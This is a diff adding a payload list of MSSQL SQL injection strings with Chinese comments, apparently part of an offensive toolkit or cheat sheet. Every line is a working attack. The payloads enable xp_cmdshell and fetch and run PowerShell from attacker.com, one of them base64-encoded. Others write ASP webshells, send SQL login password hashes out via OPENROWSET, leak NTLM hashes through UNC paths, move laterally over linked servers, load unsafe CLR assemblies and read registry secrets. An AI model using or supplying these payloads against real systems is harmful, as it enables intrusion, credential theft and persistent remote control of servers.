@@ -1,0 +1,38 @@
+# MSSQL - xp_cmdshell 反弹 Shell
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'--
+# MSSQL - xp_cmdshell 读取系统文件
+'; EXEC xp_cmdshell 'type C:\windows\system32\drivers\etc\hosts'--
+# MSSQL - xp_cmdshell 写入 Webshell
+'; EXEC xp_cmdshell 'echo ^<% Execute(Request("cmd")) %^> > C:\inetpub\wwwroot\shell.asp'--
+# MSSQL - sp_OACreate 执行命令 (禁用 xp_cmdshell 时)
+'; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'cmd.exe /c whoami > C:\temp\out.txt'--
+# MSSQL - sp_OACreate 写入 Webshell
+'; DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject',@o OUT; EXEC sp_OAMethod @o,'CreateTextFile',NULL,'C:\inetpub\wwwroot\shell.asp'; EXEC sp_OAMethod @o,'WriteLine',NULL,'<% Execute(Request("cmd")) %>'--
+# MSSQL - OpenRowset 窃取数据到攻击者服务器
+'; INSERT INTO OPENROWSET('SQLOLEDB','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=attacker.com,80;','SELECT * FROM injected') SELECT name,password FROM sys.sql_logins--
+# MSSQL - xp_dirtree UNC 路径注入窃取 NTLM 哈希
+'; EXEC master..xp_dirtree '\\attacker.com\share'--
+# MSSQL - xp_subdirs UNC 路径注入窃取 NTLM 哈希
+'; EXEC master..xp_subdirs '\\attacker.com\share'--
+# MSSQL - xp_fileexist UNC 路径注入窃取 NTLM 哈希
+'; EXEC master..xp_fileexist '\\attacker.com\share\test.txt'--
+# MSSQL - OPENROWSET 联合查询 + 堆叠执行系统命令
+'; EXEC xp_cmdshell 'powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAKAA=='--
+# MSSQL - 信任链接横向移动 (Linked Server)
+'; SELECT * FROM OPENQUERY(LINKED_SERVER,'SELECT @@version')--
+# MSSQL - 信任链接命令执行 (Linked Server + xp_cmdshell)
+'; EXEC ('EXEC xp_cmdshell ''whoami''') AT LINKED_SERVER--
+# MSSQL - CLR 程序集加载执行命令 (高权限)
+'; CREATE ASSEMBLY SQLCLR FROM 0x4D5A... WITH PERMISSION_SET=UNSAFE; CREATE PROCEDURE CmdExec AS EXTERNAL NAME SQLCLR.StoredProcedures.CmdExec--
+# MSSQL - OLE 自动化对象写入文件
+'; DECLARE @o INT; EXEC sp_OACreate 'ADODB.Stream',@o OUT; EXEC sp_OASetProperty @o,'Type',2; EXEC sp_OAMethod @o,'Open'; EXEC sp_OAMethod @o,'WriteText',NULL,'test'; EXEC sp_OAMethod @o,'SaveToFile',NULL,'C:\temp\test.txt'--
+# MSSQL - 错误信息泄露数据 (CONVERT/CAST)
+' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--
+# MSSQL - xp_regread 读取注册表存储的密码
+'; EXEC xp_regread N'HKEY_LOCAL_MACHINE',N'SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities'--
+# MSSQL - xp_servicecontrol 启动/停止服务
+'; EXEC xp_servicecontrol 'start','MSSQLSERVER'--
+# MSSQL - 查询 MSSQL 版本和数据库列表
+' UNION SELECT @@version,DB_NAME(),3,4,5--
+# MSSQL - 延时注入 WAITFOR DELAY
+'; IF (SELECT COUNT(*) FROM sys.sql_logins WHERE PWDCOMPARE('p@ss')=1)=1 WAITFOR DELAY '0:0:5'--
